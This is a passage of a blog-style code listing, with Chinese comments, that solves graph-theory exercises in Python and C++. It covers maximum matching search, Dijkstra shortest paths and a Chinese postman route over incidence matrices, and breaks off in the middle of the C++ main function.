&#123;i: [] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(v_count)&#125;</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> inc:</span><br><span class="line">        p = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x[<span class="number">1</span>] == <span class="number">1</span>, <span class="built_in">enumerate</span>(each)))</span><br><span class="line">        adj_points[p[<span class="number">0</span>][<span class="number">0</span>]].append(p[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">        adj_points[p[<span class="number">1</span>][<span class="number">0</span>]].append(p[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    result = []</span><br><span class="line">    visited = [<span class="literal">False</span>] * v_count</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 搜索每一个点开始的路径</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(v_count):</span><br><span class="line">        search(visited, i, re=[])</span><br><span class="line">    <span class="comment"># 路径按长度排序</span></span><br><span class="line">    s = <span class="built_in">sorted</span>(result, key=<span class="keyword">lambda</span> x: <span class="built_in">len</span>(x), reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;匹配数： β\u2081 = %d&quot;</span> % (<span class="built_in">len</span>(s[<span class="number">0</span>]) // <span class="number">2</span>) )</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    postman(n, m, grid)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">4 5</span></span><br><span class="line"><span class="string">1 0 0 1 1</span></span><br><span class="line"><span class="string">1 1 0 0 0</span></span><br><span class="line"><span class="string">0 0 1 1 0</span></span><br><span class="line"><span class="string">0 1 1 0 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">5 6</span></span><br><span class="line"><span class="string">1 0 0 1 0 1</span></span><br><span class="line"><span class="string">1 1 0 0 0 0</span></span><br><span class="line"><span class="string">0 1 1 0 0 0</span></span><br><span class="line"><span class="string">0 0 0 1 1 0</span></span><br><span class="line"><span class="string">0 0 1 0 1 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">5 7</span></span><br><span class="line"><span class="string">1 1 0 0 0 0 1</span></span><br><span class="line"><span class="string">1 0 0 1 0 1 0</span></span><br><span class="line"><span class="string">0 0 0 0 1 1 1</span></span><br><span class="line"><span class="string">0 1 1 0 1 0 0</span></span><br><span class="line"><span class="string">0 0 1 1 0 0 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">5 6</span></span><br><span class="line"><span class="string">1 1 0 0 0 0</span></span><br><span class="line"><span class="string">0 1 0 1 0 1</span></span><br><span class="line"><span class="string">0 0 1 1 0 0</span></span><br><span class="line"><span class="string">1 0 1 0 1 0</span></span><br><span class="line"><span class="string">0 0 0 0 1 1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="C"><a href="#C" class="headerlink" title="C++:"></a>C++:</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    vector&lt;Node&gt; child;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">vector&lt;Node&gt; points;</span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt; &gt; results;</span><br><span class="line"></span><br><span class="line"><span class="comment">//寻找所有的匹配</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> n, <span class="type">int</span> m, <span class="type">int</span> grid[][<span class="number">1000</span>], <span class="type">bool</span> edgest[], <span class="type">bool</span> pointst[], vector&lt;vector&lt;<span class="type">int</span>&gt; &gt;&amp; ans, vector&lt;<span class="type">int</span>&gt;&amp; setsize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (u&gt;m)</span><br><span class="line">	&#123;</span><br><span class="line">		vector&lt;<span class="type">int</span>&gt;path;<span class="comment">//将搜索到的边存进去</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (edgest[i])path.<span class="built_in">push_back</span>(i);</span><br><span class="line">		&#125;</span><br><span class="line">		setsize.<span class="built_in">push_back</span>(path.<span class="built_in">size</span>());</span><br><span class="line">		ans.<span class="built_in">push_back</span>(path);</span><br><span class="line">		<span class="keyword">return</span>;<span class="comment">//深度搜索完毕,搜完边就行</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> temp = <span class="number">0</span>;<span class="comment">//临时用来计算此边关联的点有没有被搜索过</span></span><br><span class="line">	<span class="type">int</span> edge[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//用来看是哪两个点</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (grid[i][u]&amp;&amp;!pointst[i])</span><br><span class="line">		&#123;</span><br><span class="line">			temp++;</span><br><span class="line">			<span class="keyword">if</span> (temp == <span class="number">1</span>)edge[<span class="number">0</span>] = i;</span><br><span class="line">			<span class="keyword">else</span> edge[<span class="number">1</span>] = i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (temp == <span class="number">2</span>)<span class="comment">//说明这条边能用</span></span><br><span class="line">	&#123;</span><br><span class="line">		edgest[u] = <span class="literal">true</span>;</span><br><span class="line">		pointst[edge[<span class="number">0</span>]] = <span class="literal">true</span>;</span><br><span class="line">		pointst[edge[<span class="number">1</span>]] = <span class="literal">true</span>;</span><br><span class="line">		<span class="built_in">dfs</span>(u + <span class="number">1</span>, n, m, grid, edgest, pointst, ans, setsize);</span><br><span class="line">		edgest[u] = <span class="literal">false</span>;</span><br><span class="line">		pointst[edge[<span class="number">0</span>]] = <span class="literal">false</span>;</span><br><span class="line">		pointst[edge[<span class="number">1</span>]] = <span class="literal">false</span>;</span><br><span class="line">		<span class="built_in">dfs</span>(u + <span class="number">1</span>, n, m, grid, edgest, pointst,ans, setsize);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;   <span class="comment">//这边不能用也能搜，但没有上面那么多，因为不用改变状态</span></span><br><span class="line">		<span class="built_in">dfs</span>(u + <span class="number">1</span>, n, m, grid, edgest, pointst, ans, setsize);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pathdfs</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> graph[][<span class="number">100</span>], <span class="type">int</span> n, vector&lt;<span class="type">int</span>&gt;&amp;ans)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> y = <span class="number">0</span>; y &lt; n; ++y) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (graph[x][y] &gt; <span class="number">0</span>) </span><br><span class="line">		&#123;</span><br><span class="line">			graph[x][y]--;</span><br><span class="line">			graph[y][x]--;</span><br><span class="line">			<span class="built_in">pathdfs</span>(y,graph,n,ans);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	ans.<span class="built_in">push_back</span>(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造最短路径</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ConstructPath</span><span class="params">(<span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; precursor, <span class="type">int</span> start, <span class="type">int</span> end, vector&lt;<span class="type">int</span>&gt;&amp; path)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	path.<span class="built_in">clear</span>();</span><br><span class="line">	<span class="type">int</span> curr = end;</span><br><span class="line">	<span class="keyword">while</span> (curr != start) </span><br><span class="line">	&#123; <span class="comment">// 从终点回溯到起点</span></span><br><span class="line">		path.<span class="built_in">push_back</span>(curr);</span><br><span class="line">		curr = precursor[curr];</span><br><span class="line">	&#125;</span><br><span class="line">	path.<span class="built_in">push_back</span>(start);</span><br><span class="line">	<span class="comment">// 反转路径，使其从起点到终点</span></span><br><span class="line">	<span class="built_in">reverse</span>(path.<span class="built_in">begin</span>(), path.<span class="built_in">end</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Dijkstra算法实现</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dijkstra</span><span class="params">(<span class="type">int</span> start, vector&lt;<span class="type">int</span>&gt;&amp; distance, vector&lt;<span class="type">int</span>&gt;&amp; precursor, vector&lt;vector&lt;<span class="type">int</span>&gt; &gt; adjacencyMatrix)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 定义无穷大的距离值</span></span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> INF = INT_MAX;</span><br><span class="line">	<span class="type">int</span> n = adjacencyMatrix.<span class="built_in">size</span>();</span><br><span class="line">	distance.<span class="built_in">resize</span>(n, INF); <span class="comment">// 初始化距离数组为无穷大</span></span><br><span class="line">	distance[start] = <span class="number">0</span>; <span class="comment">// 起点到自身的距离为0</span></span><br><span class="line">	precursor.<span class="built_in">resize</span>(n, <span class="number">-1</span>); <span class="comment">// 初始化前驱节点数组，表示还未访问的节点前驱为-1</span></span><br><span class="line"> </span><br><span class="line">	priority_queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;, vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt;, greater&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt; &gt; pq; <span class="comment">// 小顶堆存储未访问节点</span></span><br><span class="line">	pq.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(<span class="number">0</span>, start)); <span class="comment">// 将起点加入小顶堆</span></span><br><span class="line"> </span><br><span class="line">	<span class="keyword">while</span> (!pq.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">		<span class="type">int</span> dist = pq.<span class="built_in">top</span>().first;</span><br><span class="line">		<span class="type">int</span> currNode = pq.<span class="built_in">top</span>().second;</span><br><span class="line">		pq.<span class="built_in">pop</span>();</span><br><span class="line"> </span><br><span class="line">		<span class="comment">// 如果当前节点已经被访问过，跳过</span></span><br><span class="line">		<span class="keyword">if</span> (dist &gt; distance[currNode]) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">		<span class="comment">// 遍历当前节点的相邻节点</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (adjacencyMatrix[currNode][i] != INF) </span><br><span class="line">			&#123; <span class="comment">// 判断当前节点与相邻节点是否存在连接</span></span><br><span class="line">				<span class="type">int</span> newDistance = dist + adjacencyMatrix[currNode][i];</span><br><span class="line">				<span class="keyword">if</span> (newDistance &lt; distance[i]) </span><br><span class="line">				&#123; <span class="comment">// 如果新的距离更小</span></span><br><span class="line">					distance[i] = newDistance;</span><br><span class="line">					precursor[i] = currNode; <span class="comment">// 更新前驱节点</span></span><br><span class="line">					pq.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(newDistance, i));</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">postman</span><span class="params">(<span class="type">int</span> n,<span class="type">int</span> m,<span class="type">int</span> grid[][<span class="number">1000</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//分三种情况，欧拉图，半欧拉图，非欧拉图</span></span><br><span class="line">	<span class="type">bool</span> flag1 = <span class="literal">false</span>, flag2 = <span class="literal">false</span>, flag3 = <span class="literal">false</span>;<span class="comment">//与上面情况对应</span></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; path;<span class="comment">//存放每个点度数</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (grid[i][j])</span><br><span class="line">				sum++;</span><br><span class="line">		&#125;</span><br><span class="line">		path.<span class="built_in">push_back</span>(sum);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> odd=<span class="number">0</span>;<span class="comment">//记录有多少个奇数顶点,同时存下奇数度顶点</span></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; oddnum;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">		<span class="keyword">if</span> (path[i] % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			odd++;</span><br><span class="line">			oddnum.<span class="built_in">push_back</span>(i);</span><br><span class="line">		&#125;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;result;<span class="comment">//存放结果</span></span><br><span class="line">	<span class="comment">//若odd为0则代表其为欧拉图,所有的度数均为偶数</span></span><br><span class="line">	<span class="comment">//将关联矩阵转化为邻接矩阵和边矩阵</span></span><br><span class="line">	<span class="type">int</span> graph[<span class="number">50</span>][<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;, ed[<span class="number">50</span>][<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">	&#123;</span><br><span class="line">		vector&lt;<span class="type">int</span>&gt;arr;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (grid[i][j])arr.<span class="built_in">push_back</span>(i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">int</span> L = arr[<span class="number">0</span>], r = arr[<span class="number">1</span>];</span><br><span class="line">		graph[L][r] = <span class="number">1</span>;</span><br><span class="line">		graph[r][L] = <span class="number">1</span>;</span><br><span class="line">		ed[L][r] = j;</span><br><span class="line">		ed[r][L] = j;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (odd != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> dfsgridst[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i &lt; path.<span class="built_in">size</span>(); i++)dfsgridst[path[i]] = i;</span><br><span class="line">		<span class="type">int</span> oddgrid[<span class="number">100</span>][<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;<span class="comment">//存奇数顶点的对应的最短路的矩阵</span></span><br><span class="line">		vector&lt;vector&lt;vector&lt;<span class="type">int</span>&gt; &gt; &gt;<span class="built_in">oddpath</span>(odd, vector&lt;vector&lt;<span class="type">int</span>&gt; &gt;(odd));</span><br><span class="line">		<span class="comment">// 定义无穷大的距离值</span></span><br><span class="line">		<span class="type">const</span> <span class="type">int</span> INF = INT_MAX;</span><br><span class="line">		vector&lt;vector&lt;<span class="type">int</span>&gt; &gt; <span class="built_in">adjacencyMatrix</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, INF));</span><br><span class="line">		vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">		<span class="comment">//用adjacencyMatrix存邻接矩阵</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			vector&lt;<span class="type">int</span>&gt;arr;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//若不能直接到达那么距离是无穷</span></span><br><span class="line">				<span class="keyword">if</span> (grid[i][j])arr.<span class="built_in">push_back</span>(i);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="type">int</span> L = arr[<span class="number">0</span>], r = arr[<span class="number">1</span>];</span><br><span class="line">			adjacencyMatrix[L][r] = <span class="number">1</span>;</span><br><span class="line">			adjacencyMatrix[r][L] = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)adjacencyMatrix[i][i] = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; odd; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">int</span> start = oddnum[i]; <span class="comment">// 起点</span></span><br><span class="line">			vector&lt;<span class="type">int</span>&gt; distance; <span class="comment">// 保存最短距离的数组</span></span><br><span class="line">			vector&lt;<span class="type">int</span>&gt; precursor; <span class="comment">// 保存前驱节点的数组</span></span><br><span class="line">			</span><br><span class="line">			<span class="built_in">Dijkstra</span>(start, distance, precursor, adjacencyMatrix);</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; distance.<span class="built_in">size</span>(); k++)<span class="comment">//distance里面存起点到第k个点的最短距离</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> z = <span class="number">0</span>; z &lt; odd; z++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (oddnum[z] == k)</span><br><span class="line">					&#123;</span><br><span class="line">						oddgrid[i][z] = distance[k];</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; odd; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (i == j)</span><br><span class="line">				&#123;</span><br><span class="line">					oddpath[i][j].<span class="built_in">push_back</span>(<span class="number">0</span>);</span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				vector&lt;<span class="type">int</span>&gt; path; <span class="comment">// 保存最短路径的数组</span></span><br><span class="line">				<span class="type">int</span> end = oddnum[j]; <span class="comment">// 终点</span></span><br><span class="line">				<span class="built_in">ConstructPath</span>(precursor, start, end, path);	</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; path.<span class="built_in">size</span>(); ++k) &#123;</span><br><span class="line">				    <span class="type">int</span> x = path[k];</span><br><span class="line">				    oddpath[i][j].<span class="built_in">push_back</span>(x);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;		</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">		vector&lt;vector&lt;<span class="type">int</span>&gt; &gt;ansdfs;</span><br><span class="line">		vector&lt;<span class="type">int</span>&gt;setsize;</span><br><span class="line">		<span class="type">bool</span> edgest[<span class="number">100</span>] = &#123; <span class="literal">false</span> &#125;, pointst[<span class="number">100</span>] = &#123; <span class="literal">false</span> &#125;;</span><br><span class="line">		<span class="comment">//将oddnum转化为关联矩阵,有n*（n-1）/2条边</span></span><br><span class="line">		<span class="type">int</span> dfsgrid[<span class="number">20</span>][<span class="number">1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		<span class="type">int</span> eddfs[<span class="number">100</span>][<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; odd; i++)</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; odd; j++)eddfs[i][j] = <span class="number">-1</span>;</span><br><span class="line">		<span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> p = <span class="number">0</span>; p &lt; odd; p++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> z = p<span class="number">+1</span>; z &lt; odd; z++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (oddgrid[p][z])<span class="comment">//若有边就将其存入关联矩阵当中</span></span><br><span class="line">				&#123;</span><br><span class="line">					dfsgrid[p][idx] = <span class="number">1</span>;</span><br><span class="line">					dfsgrid[z][idx] = <span class="number">1</span>;</span><br><span class="line">					eddfs[p][z] = idx;</span><br><span class="line">					eddfs[z][p] = idx;</span><br><span class="line">					idx++;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">dfs</span>(<span class="number">0</span>, odd, idx, dfsgrid, edgest, pointst, ansdfs, setsize);</span><br><span class="line">		<span class="type">int</span> len = ansdfs.<span class="built_in">size</span>();</span><br><span class="line">		<span class="type">int</span> max = <span class="number">0</span>;<span class="comment">//记录最大匹配的位置;</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (setsize[i] &gt; max)</span><br><span class="line">				max = i;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">int</span> reslong = ansdfs[max].<span class="built_in">size</span>();<span class="comment">//记录找到的数组的长度</span></span><br><span class="line">		<span class="comment">//将所有的最大匹配集输出</span></span><br><span class="line">		<span class="type">int</span> mindfs = INF;</span><br><span class="line">		<span class="type">int</span> flagdfs = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; len; k++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (setsize[k] == reslong)<span class="comment">//若是最大匹配集的长度就将对应的路径加到矩阵当中</span></span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; reslong; i++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">for</span> (<span class="type">int</span> edi = <span class="number">0</span>; edi &lt; odd; edi++)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">for</span> (<span class="type">int</span> edj = edi + <span class="number">1</span>; edj &lt; odd; edj++)</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">if</span> (ansdfs[k][i] == eddfs[edi][edj])</span><br><span class="line">							&#123;</span><br><span class="line">								sum += oddpath[edi][edj].<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (sum &lt; mindfs)</span><br><span class="line">				&#123;</span><br><span class="line">					mindfs = sum;</span><br><span class="line">					flagdfs = k;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		vector&lt;vector&lt;<span class="type">int</span>&gt; &gt;finalans;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; reslong; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> edi = <span class="number">0</span>; edi &lt; odd; edi++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> edj = edi + <span class="number">1</span>; edj &lt; odd; edj++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (ansdfs[flagdfs][i] == eddfs[edi][edj])</span><br><span class="line">					&#123;</span><br><span class="line">						finalans.<span class="built_in">push_back</span>(oddpath[edi][edj]);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; finalans.<span class="built_in">size</span>(); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; finalans[i].<span class="built_in">size</span>()<span class="number">-1</span>; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="type">int</span> Le = finalans[i][j], ri = finalans[i][j + <span class="number">1</span>];</span><br><span class="line">				graph[Le][ri] += <span class="number">1</span>;</span><br><span class="line">				graph[ri][Le] += <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">	<span class="built_in">pathdfs</span>(<span class="number">0</span>, graph, n, ans);</span><br><span class="line">	<span class="type">int</span> needlen = ans.<span class="built_in">size</span>();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nCPP解：&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; needlen<span class="number">-1</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;e%d &quot;</span>, ed[ans[i]][ans[i + <span class="number">1</span>]]<span class="number">+1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(vector&lt;<span class="type">bool</span>&gt; visited, <span class="type">int</span> start, vector&lt;<span class="type">int</span>&gt; rep)</span> </span>&#123;</span><br><span class="line">    visited[start] = <span class="literal">true</span>;</span><br><span class="line">    rep.<span class="built_in">push_back</span>(start);</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;points[start].child.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!visited[points[start].child[i].num]) &#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="built_in">search</span>(visited, points[start].child[i].num, rep);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">        results.<span class="built_in">push_back</span>(rep);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">CompareVectors</span> &#123;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; x, <span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; y)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x.<span class="built_in">size</span>() &gt; y.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		points.<span class="built_in">clear</span>();</span><br><span class="line">		results.<span class="built_in">clear</span>();</span><br><span class="line">		<span class="type">int</span> grid[<span class="number">100</span>][<span class="number">1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		<span class="type">int</span> n, m;</span><br><span class="line">	 </span><br><span class="line">		vector&lt;vector&lt;<span class="type">int</span>&gt; &gt;ans;</span><br><span class="line">		vector&lt;<span class="type">int</span>&gt;setsize;</span><br><span class="line">		<span class="type">bool</span> edgest[<span class="number">100</span>] = &#123; <span class="literal">false</span> &#125;, pointst[<span class="number">100</span>] = &#123; <span class="literal">false</span> &#125;;</span><br><span class="line">		</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;请输入边数和点数：（输入‘0’退出）&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cin &gt;&gt; n;</span><br><span class="line">		</span><br><span class="line">		<span 